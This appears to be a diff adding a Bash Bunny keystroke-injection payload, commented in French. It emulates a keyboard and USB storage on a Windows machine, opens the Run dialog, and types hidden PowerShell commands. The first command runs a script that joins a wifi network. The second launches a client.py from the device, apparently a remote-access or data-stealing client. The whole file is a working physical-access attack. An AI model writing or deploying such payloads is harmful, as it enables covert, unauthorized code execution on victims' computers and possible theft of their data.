@@ -1,0 +1,30 @@
+LED SETUP
+
+GET SWITCH_POSITION
+
+ATTACKMODE HID STORAGE
+
+LED STAGE1
+
+Q DELAY 3000
+
+LED STAGE2
+
+# windows + r
+Q GUI r
+Q DELAY 100
+
+# connection a la wifi (on execute connect_to_wifi.ps1) 
+Q STRING powershell -NoP -NonI -W Hidden ".\((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\connect_to_wifi.ps1')"
+Q ENTER
+
+# on attend 10s pour etre sur que la connection wifi se fasse
+Q DELAY 10000
+
+# windows + r
+Q GUI r
+Q DELAY 100
+
+# on lance client.py
+Q STRING powershell -NoP -NonI -W Hidden "python ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\client.py')"
+Q ENTER
